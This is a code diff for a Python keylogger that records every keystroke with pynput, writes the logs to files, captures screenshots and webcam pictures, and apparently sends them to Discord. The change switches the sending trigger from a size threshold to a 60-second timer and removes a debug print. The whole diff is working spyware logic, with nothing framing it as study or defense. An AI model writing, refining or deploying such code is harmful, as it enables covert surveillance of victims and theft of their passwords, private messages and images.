@@ -4,9 +4,9 @@ from pynput.keyboard import Listener, Key
 
 from classes.Host import Host
 from discord_util import discord
-from utils.file_util import write_keys_to_file, get_object_size, write_legible_text_to_file, take_screenshot, \
+from utils.file_util import write_keys_to_file, write_legible_text_to_file, take_screenshot, \
     take_picture_from_webcam
-from utils.time_util import get_current_date_and_time, get_current_date
+from utils.time_util import get_current_date_and_time, get_current_date, now, get_difference_in_seconds
 
 key_log = {}
 
@@ -15,8 +15,7 @@ host = Host()
 json_file = "log_json_keys.txt"
 legible_text_file = "log_legible.txt"
 
-# discord file sending limit is 8MB, but we will use 5MB to be safe
-discord_file_size_limit = 5
+message_sent_at = now()
 
 
 def notify_log_started():
@@ -25,11 +24,12 @@ def notify_log_started():
 
 
 def should_send_file(key):
-    object_size = get_object_size(key_log)
     if len(key_log) <= 2:
         return False
-    # using this size for testing purposes
-    return object_size >= 0.002 and (key == Key.enter or key == Key.space)
+    if get_difference_in_seconds(message_sent_at, now()) < 60:
+        return False
+
+    return (get_difference_in_seconds(message_sent_at, now()) >= 60) and (key == Key.enter or key == Key.space)
 
 
 def do_screenshot():
@@ -52,7 +52,6 @@ def on_press(key):
     time = get_current_date_and_time()
     key_log[time] = str(key).replace("'", "")
 
-    print(get_object_size(key_log))
     if should_send_file(key):
         write_keys_to_file(key_log, json_file, host)
         current_date = get_current_date()
@@ -66,6 +65,8 @@ def on_press(key):
         key_log.clear()
         do_screenshot()
         take_webcam_picture()
+        global message_sent_at
+        message_sent_at = now()
 
 
 def log():
